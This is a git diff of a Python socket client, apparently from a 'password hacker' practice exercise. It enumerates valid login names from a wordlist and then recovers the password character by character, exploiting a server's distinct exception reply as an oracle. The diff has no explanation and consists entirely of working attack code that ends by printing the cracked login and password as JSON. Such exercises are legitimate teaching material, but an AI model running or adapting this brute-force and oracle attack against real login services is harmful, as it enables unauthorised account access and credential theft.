@@ -2,7 +2,7 @@ import socket
 import itertools
 import sys
 import string
-import os
+import json
 
 
 HOST = sys.argv[1]
@@ -11,8 +11,6 @@ ADRESS = (HOST, PORT)
 numbers = string.digits
 whole_list = []
 flag = False
-password = ""
-n = 1
 
 
 def variant(file):
@@ -23,25 +21,50 @@ def variant(file):
                 yield variation
 
 
-var = variant("passwords.txt")
+def send_receive(socket_, msg_):
+    data = json.dumps(msg_, indent=4).encode()
+    # sending through socket
+    socket_.send(data)
+    response = socket_.recv(10240)
+    response_py = json.loads(response.decode())
+    return response_py
+
+
+var_login = variant("logins.txt")
 
 
 with socket.socket() as s:
     s.connect(ADRESS)
     while not flag:
-        try:
-            password = next(var)
-            password = password.encode()
-            s.send(password)
-            result = s.recv(10240)
-            result = result.decode()
-            if result == "Connection success!":
-                password = password.decode()
-                print(password)
+        login = next(var_login)
+        message = {"login": login,
+                   "password": " "}
+        result = send_receive(s, message)
+        if result == {"result": "Wrong password!"}:
+            right_login = "".join(login)
+            flag = True
+            break
+    flag = False
+    password = ''
+    pass_status = {}
+    while not flag:
+        password_iterator = itertools.product(string.ascii_letters + string.digits, repeat=1)
+        for j in password_iterator:
+            letter = ''.join(j)
+            message_2 = {"login": right_login, "password": password + letter}
+            try:
+                pass_status = send_receive(s, message_2)
+            except ConnectionResetError:
+                pass
+            except ConnectionAbortedError:
+                pass
+            if pass_status == {"result": "Connection success!"}:
+                password += letter
                 flag = True
                 break
-        except StopIteration:
-            print('All passwords have been attempted!')
-            break
+            if pass_status == {'result': "Exception happened during login"}:
+                password += letter
 
+result = {"login": right_login, "password": password}
+print(json.dumps(result, indent=4))
 
